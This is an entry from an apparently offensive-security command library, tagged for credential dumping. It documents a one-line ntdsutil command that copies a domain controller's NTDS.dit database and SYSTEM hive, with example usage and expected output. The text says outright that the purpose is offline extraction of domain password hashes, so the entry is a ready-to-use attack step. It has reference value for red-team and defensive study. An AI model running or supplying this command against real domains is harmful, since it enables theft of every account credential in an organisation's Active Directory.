---
type: command
executor: cmd
data: ntdsutil "ac i ntds" "ifm" "create full $_BACKUP_PATH" q q
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - active-directory
  - credential-dumping
verified: true
validated: true
---

# ntdsutil-create-full-ifm-backup

## Command

```cmd
ntdsutil "ac i ntds" "ifm" "create full $_BACKUP_PATH" q q
```

## Description

This command uses ntdsutil to create a full Install From Media (IFM) backup of the Active Directory NTDS instance in a single line, capturing the database and registry hives for offline credential extraction. Use this on a Domain Controller with admin privileges to dump domain hashes without external tools.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_BACKUP_PATH | Full path to the directory where the backup will be saved (e.g., C:\temp). Must be writable by the current user. | Yes |

## Examples

### Basic Usage

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q
```

### Advanced Usage

For a specific volume or with error handling, use interactive mode instead, but this one-liner supports paths with spaces if quoted properly.

## Expected Output

```
ntdsutil: ac i ntds
Active instance                NTDS
ntdsutil: ifm
ifm: create full C:\temp
Snapshot created at 2023-10-01 12:00:00
Full backup created successfully
ifm: q
ntdsutil: q
```

The command creates a folder like 'C:\temp\Active Directory' containing NTDS.dit, SYSTEM, and log files. Success is indicated by no errors and the presence of these files; failure may show 'Access denied' if privileges are insufficient.

## Related

- [[procedures/Dumping-AD-Domain-Credentials-using-ntdsutil]]
